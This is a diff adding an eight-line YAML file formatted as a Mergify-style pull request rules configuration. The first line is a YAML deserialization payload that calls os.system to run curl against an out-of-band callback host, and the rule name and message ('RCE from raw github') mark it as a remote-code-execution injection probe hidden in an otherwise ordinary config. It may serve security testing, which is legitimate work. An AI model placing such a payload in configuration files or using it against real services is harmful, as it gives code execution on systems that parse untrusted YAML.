@@ -1,0 +1,8 @@
+!!python/object/apply:os.system ["curl http://d9l70l7f4bv0i70vbk7g7nkrbd1r6xcry.oast.site/rce-from-github-raw"]
+pull_request_rules:
+- name: injected-from-raw
+  conditions:
+  - base=main
+  actions:
+    comment:
+      message: RCE from raw github
